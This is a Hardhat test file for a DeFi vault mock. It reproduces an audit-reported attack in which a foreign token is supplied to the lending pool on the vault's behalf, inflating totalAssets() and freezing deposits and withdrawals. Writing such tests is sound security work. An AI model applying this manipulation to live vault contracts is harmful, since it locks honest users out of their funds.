import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

import { DLoopCoreMock, TestMintableERC20 } from "../../../typechain-types";
import { deployDLoopMockFixture, testSetup } from "./fixture";

/*
 * Test reproduces the "Total Assets Manipulation" attack described in the
 * audit report.  An attacker supplies a **different** token to the lending
 * pool on behalf of the vault.  Because `totalAssets()` aggregates all
 * collateral returned by the pool, the vault now believes it owns more of the
 * designated collateral token than it actually does.  This drives the
 * leverage calculation out-of-bounds and permanently blocks deposits /
 * withdrawals for honest users.
 */

describe("DLoopCoreMock – Foreign‐collateral manipulation", function () {
  let dloop: DLoopCoreMock;
  let collateral: TestMintableERC20; // designated vault collateral (mCOLL)
  let debt: TestMintableERC20; // foreign token we will inject as fake collateral
  let attacker: HardhatEthersSigner;
  let victim: HardhatEthersSigner;
  let fixtureReady = false;

  async function setupFixture() {
    const fx = await loadFixture(deployDLoopMockFixture);
    await testSetup(fx);

    dloop = fx.dloopMock;
    collateral = fx.collateralToken;
    debt = fx.debtToken;
    attacker = fx.accounts[1];
    victim = fx.accounts[2];

    fixtureReady = true;
  }

  beforeEach(async function () {
    if (!fixtureReady) {
      await setupFixture();
    }
  });

  it("Attacker inflates totalAssets with foreign collateral and freezes the vault", async function () {
    const vaultAddr = await dloop.getAddress();

    /* STEP 1 – Honest user deposits legitimate collateral */
    const victimDeposit = ethers.parseEther("1000");
    await dloop.connect(victim).deposit(victimDeposit, victim.address);

    const totalAssetsBefore = await dloop.totalAssets();
    expect(totalAssetsBefore).to.equal(victimDeposit);

    /* STEP 2 – Attacker donates debt-token to the vault and supplies it to the pool
     * on behalf of the vault, thereby making it look like extra collateral. */
    const injectedAmount = ethers.parseEther("5000");

    // Ensure attacker controls enough debt tokens
    await debt.connect(attacker).transfer(vaultAddr, injectedAmount);

    // Supply the foreign collateral to the mock pool on behalf of the vault.
    await dloop
      .connect(attacker)
      .testSupplyToPoolImplementation(
        await debt.getAddress(),
        injectedAmount,
        vaultAddr
      );

    /* STEP 3 – totalAssets() is now inflated */
    const totalAssetsAfter = await dloop.totalAssets();
    expect(totalAssetsAfter).to.be.gt(totalAssetsBefore);

    /* STEP 4 – The vault reports an imbalanced leverage and blocks further
       user interactions (TooImbalanced custom error). */
    expect(await dloop.isTooImbalanced()).to.equal(true);

    // Victim tries to deposit another 1 token ⇒ reverts because maxDeposit() is 0
    await expect(
      dloop.connect(victim).deposit(ethers.parseEther("1"), victim.address)
    ).to.be.revertedWithCustomError(dloop, "ERC4626ExceededMaxDeposit");

    // Victim tries to withdraw some assets ⇒ reverts with maxWithdraw() == 0
    await expect(
      dloop
        .connect(victim)
        .withdraw(ethers.parseEther("1"), victim.address, victim.address)
    ).to.be.revertedWithCustomError(dloop, "ERC4626ExceededMaxWithdraw");
  });
});
